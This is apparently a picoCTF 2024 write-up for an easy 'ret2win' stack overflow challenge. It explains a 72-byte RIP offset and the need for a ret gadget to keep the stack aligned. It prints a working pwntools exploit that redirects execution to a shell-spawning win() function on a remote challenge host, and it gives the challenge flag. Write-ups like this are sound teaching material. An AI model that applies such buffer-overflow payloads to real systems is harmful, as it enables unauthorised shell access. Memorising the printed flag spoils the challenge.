---
title: "ret2win — Orbital Mechanics of the Stack"
ctf: "picoCTF 2024"
category: "pwn"
difficulty: "easy"
points: 100
date: "2024-03-03"
lat: 51.5
lng: -0.12
summary: "Hijacking RIP and slingshotting execution into a hidden win() function. Mind the 16-byte alignment."
tags: ["ret2win", "rip", "alignment"]
---

## The Hidden Function

```c
void win() {
    system("/bin/sh");
}
```

## Offset

Using cyclic patterns we find the saved RIP offset is 72 bytes.

## Alignment Trap

Simply jumping to `win` segfaults inside `system` because of `movaps` instructions requiring a 16-byte aligned stack. Add a single `ret` gadget before the call:

```python
from pwn import *

elf = ELF("./vuln")
io = remote("orbital.picoctf.net", 1337)

ret = 0x40101a  # ret gadget
payload = b"A"*72 + p64(ret) + p64(elf.sym.win)
io.sendline(payload)
io.interactive()
```

**Flag:** `picoCTF{r3t_2_w1n_4lign3d}`